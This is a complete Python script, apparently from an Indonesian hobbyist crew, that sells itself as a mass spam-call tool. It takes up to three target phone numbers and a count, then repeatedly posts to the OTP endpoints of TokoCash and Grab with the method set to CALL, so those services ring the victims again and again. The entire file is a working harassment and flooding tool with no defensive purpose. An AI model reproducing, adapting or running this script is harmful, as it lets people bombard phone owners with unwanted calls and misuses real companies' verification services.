#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by A'initial
"""
ngapain??? bilang kalau ngoding
Itu SUSAHHH !!!!
"""

try:
	import os, requests, time
except ModuleNotFoundError:
	print("\nSepertinya module requests BELUM Di Install")
	print("$ pip install requests\n")
	exit()

os.system('clear')
c=('\033[1;36m')
r=('\033[1;31m')
g=('\033[1;32m')
w=('\033[1;37m')
print("""%s
			SPAM CALL MASSAL v.3.0%s
 ,_     _‚
 |\\\___//|	%sAuthor: A'initial%s
 |=6   6=|	%sContact: +6285101970588%s
 \=._Y_.=/	%sPartner: Z-vector>ErikGayn>PakPung>Ahmad R%s
  )  `  (    ,	%sTEAM: SEMARANG CREW%s
 /       \  ((
 |       |   ))
/| |   | |\_//	%sMASUKAN NOMOR DENGAN "62" (EX: 628XXXXXX)%s
\| |._.| |/-’
 '"'   '"'
<NOTE> Jika terjadi ERROR atau BUG dan lain-lain, Jangan hubungi saia :V"""%(c,r,g,r,g,r,g,r,g,r,w,r))
print("%s[*] Klik ENTER untuk melewati step%s"%(g,g))
no1 = input("[?] NUM TARGET 1 => %s"%(w))
no2 = input("%s[?] NUM TARGET 2 => %s"%(g,w))
no3 = input("%s[?] NUM TARGET 3 => %s"%(g,w))
jlmh=int(input("%s[?] JUMLAH SPAM :v => %s"%(g,w)))
dt1={'method':'CALL','countryCode':'id','phoneNumber':no1,'templateID':'pax_android_production'}
dt2={'method':'CALL','countryCode':'id','phoneNumber':no2,'templateID':'pax_android_production'}
dt3={'method':'CALL','countryCode':'id','phoneNumber':no3,'templateID':'pax_android_production'}

try:
	print()
	print("%s[-] RESULT:%s"%(r,w))
	for i in range(jlmh):
		print("[!] Wait Asw :'V...")
		idk=("challengeID")
		r1 = requests.post('https://www.tokocash.com/oauth/otp',data=dt1)
		r2 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt2)
		r3 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt3)
		if str(idk) in str(r1.text):
			print("[+] TARGET1 BERHASIL")
		else:
			print("[-] TARGET1 Mampod gagal :'V")
		if str(idk) in str(r2.text):
			print("[+] TARGET2 Succes :'V")
		else:
			print("[-] TARGET2 Mampod gagal :'V")
		if str(idk) in str(r3.text):
			print("[+] TARGET3 Succes :'V")
		else:
			print("[-] TARGET3 Mampod gagal :'V")
		print("="*30)
		time.sleep(1)
except KeyboardInterrupt:
	print("%follow : A'initial"%(c))
